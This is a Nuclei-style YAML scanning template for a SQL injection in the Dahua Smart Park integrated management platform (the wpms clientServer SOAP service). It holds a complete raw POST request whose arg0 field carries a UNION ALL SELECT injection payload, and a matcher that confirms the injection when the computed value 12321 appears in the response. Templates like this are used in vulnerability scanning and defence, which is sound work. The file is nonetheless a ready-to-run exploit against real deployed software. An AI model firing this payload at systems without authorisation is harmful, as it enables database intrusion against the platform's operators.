大华智慧园区综合管理平台-wpms-clientserver-sql注入.yaml

id: dahua-clientServer-sqli

info:
  name: dahua-clientServer-sqli
  author: dahua-clientServer-sqli

requests:
  - raw:
      - |
        POST /portal/services/clientServer HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
        Connection: close
        AContent-Type: text/xml;charset=UTF-8
        Accept-Encoding: gzip

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
          <soapenv:Header/>
          <soapenv:Body>
          <cli:getGroupInfoListByGroupId>
            <!--type: string-->
              <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,CONCAT(0x7178787a71,IFNULL(CAST(111*111 AS NCHAR),0x20),0x7171717871)-- -</arg0>
            <!--type: long-->
            <arg1>10</arg1>
            </cli:getGroupInfoListByGroupId>
            </soapenv:Body>
          </soapenv:Envelope>


    matchers:
      - type: dsl
        dsl:
          - contains(body,'12321')

